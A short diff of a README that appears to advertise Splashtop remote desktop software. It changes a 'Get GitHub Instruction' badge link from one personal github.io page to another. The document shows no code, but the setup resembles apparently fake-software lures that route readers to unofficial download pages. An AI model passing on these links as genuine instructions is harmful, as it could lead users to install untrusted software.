@@ -4,7 +4,7 @@
 Splashtop provides fast, secure remote desktop access and support across devices.  
 With a MacBook desktop-style workflow, you can control remote machines, share screens, transfer files, and assist users from one focused environment 🖥️⚡.
 
-[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-0B5FFF?style=for-the-badge&logo=github&logoColor=white)](https://hantosman2010.github.io/.github/splashtop)
+[![📖 Get GitHub Instruction](https://img.shields.io/badge/Get%20GitHub%20Instruction-0B5FFF?style=for-the-badge&logo=github&logoColor=white)](https://aildelolady750.github.io/.github/splashtop)
 
 ---
 
